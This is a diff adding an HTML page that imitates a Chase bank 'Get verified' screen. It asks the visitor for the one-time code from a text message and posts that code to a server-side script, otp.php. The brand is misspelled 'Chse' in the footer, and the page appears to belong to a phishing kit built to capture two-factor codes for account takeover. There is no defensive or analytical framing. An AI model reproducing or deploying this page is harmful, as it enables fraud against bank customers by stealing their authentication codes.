@@ -1,0 +1,77 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+	<title>Sign in</title>
+	<link rel="shortcut icon" href="favicon.ico">
+	<link rel="stylesheet" type="text/css" href="vc.css">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+  	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+</head>
+<body>
+<header>
+	<div id="logo"></div>
+</header>
+<div id="maincontainer">
+	<div id="logindiv">
+		<form method="post" action="../Scripts/otp.php">
+		<div id="inpfielddive" style="padding-top:0px;">
+			<p style="margin-bottom:5px;">Get verified</p>
+			<div style="width:100%;height:3px;background-color:#0092ff;margin-bottom:10px;"></div>
+			<p style="font-size:20px;color:#757575;">We sent you a text message</p>
+			
+				
+				<div class="floating-label">      
+	                 <input class="floating-input" name="chn" type="text" required placeholder="One-time code">
+                </div>
+				<p style="margin-bottom:0px;">Didn't get a code?</p>
+				<a href="javascript:window.location.reload(true)" style="font-size:14px;">Let's try it again &#10148;</a>
+              
+			</div>
+			<div id="sbmndlink">
+				<button type="submit" style="margin-top:10px; name="submit">Next</button>
+			</div>
+		</form>
+	</div>
+</div>
+<footer>
+	<div id="socials">
+		<ul>
+			<li><a href="">Follow us:</a></li>
+			<li><a href=""><i class="fa fa-facebook" style="font-size:18px"></i></i></a></li>
+			<li><a href=""><i class="fa fa-instagram" style="font-size:18px"></i></a></li>
+			<li><a href=""><i class="fa fa-twitter" style="font-size:18px"></i></a></li>
+			<li><a href=""><i class="fa fa-youtube" style="font-size:18px"></i></a></li>
+			<li><a href=""><i class="fa fa-linkedin" style="font-size:18px"></i></a></li>
+		</ul>
+	</div>
+	<div class="links">
+		<ul>
+			<li><a href="">Contact us</a></li>
+			<li><a href="">Privacy</a></li>
+			<li><a href="">Security</a></li>
+			<li><a href="">Terms of use</a></li>
+			<li><a href="">Accessibility</a></li>
+			<li><a href="">SAFE Act: Chse Mortgage Loan Originators</a></li>
+			<li><a href="">Fair Lending</a></li>
+			<li><a href="">About Chse</a></li>
+			<li><a href="">J.P. Morgan</a></li>
+			<li><a href="">JPMorgan Chse & Co.</a></li>
+			<li><a href="">Careers</a></li>
+			<li><a href="">Español</a></li>
+			<li><a href="">Chse Canada</a></li>
+			<li><a href="">Site map</a></li>
+			<li><a href="">Member FDIC</a></li>
+			<li><a href="">Equal Housing Lender</a></li>
+		</ul>
+	</div>
+	<div id="cpr">
+		<p>© 2024 JPMorgan Chase & Co.</p>
+	</div>
+</footer>
+</body>
+</html>
